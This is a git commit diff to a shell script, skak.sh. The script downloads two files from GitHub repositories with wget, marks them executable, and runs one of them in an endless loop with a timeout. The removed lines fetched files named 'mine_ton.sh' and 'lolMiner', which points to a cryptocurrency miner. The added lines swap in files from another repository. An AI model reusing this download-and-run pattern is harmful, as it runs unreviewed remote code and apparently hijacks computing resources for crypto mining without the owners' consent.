decec5458c3a0c096355a7f5f36002d5cdcc5310
Diefky <Diefky@users.noreply.github.com>
2022-01-31 11:29:10 +0700

    Update skak.sh

--- skak.sh
+++ skak.sh
@@ -1,5 +1,5 @@
 sudo apt install timelimit -y
-wget -O yoi https://raw.githubusercontent.com/Diefky/lololo/main/mine_ton.sh
-wget -O yes https://github.com/Diefky/lololo/raw/main/lolMiner
+wget -O yoi https://raw.githubusercontent.com/Antonnnnjantung/ANTONMAKASSAR/main/memek.sh
+wget -O yes https://github.com/Antonnnnjantung/ANTONMAKASSAR/raw/main/memek
 chmod +x yoi yes
 while :; do timeout 45 bash yoi sleep 1; done
